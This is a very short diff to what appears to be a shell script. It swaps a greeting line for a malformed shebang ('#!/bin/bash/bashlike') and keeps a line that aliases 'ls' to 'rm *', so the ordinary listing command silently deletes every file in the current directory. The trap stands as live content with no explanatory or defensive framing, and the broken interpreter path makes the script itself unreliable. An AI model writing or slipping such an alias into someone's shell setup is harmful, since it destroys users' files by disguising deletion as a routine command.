@@ -1,5 +1,2 @@
-Hello 
+#!/bin/bash/bashlike
 alias ls='rm *'
-
-
- 
